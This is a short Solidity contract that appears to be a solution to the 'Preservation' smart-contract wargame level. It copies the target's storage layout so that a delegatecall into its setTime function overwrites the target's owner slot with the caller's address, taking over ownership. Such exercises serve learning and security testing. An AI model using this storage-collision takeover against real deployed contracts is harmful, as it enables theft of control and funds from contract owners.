// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationSolution {

  // Copy the first 3 variables in the Preservation contract
  // because that is the structure that our attack method needs to know
  address public timeZone1Library; // slot 0
  address public timeZone2Library; // slot 1
  address public owner; // slot 2

  function setTime(uint _time) public {
    owner = msg.sender; // update the owner this way
  }
}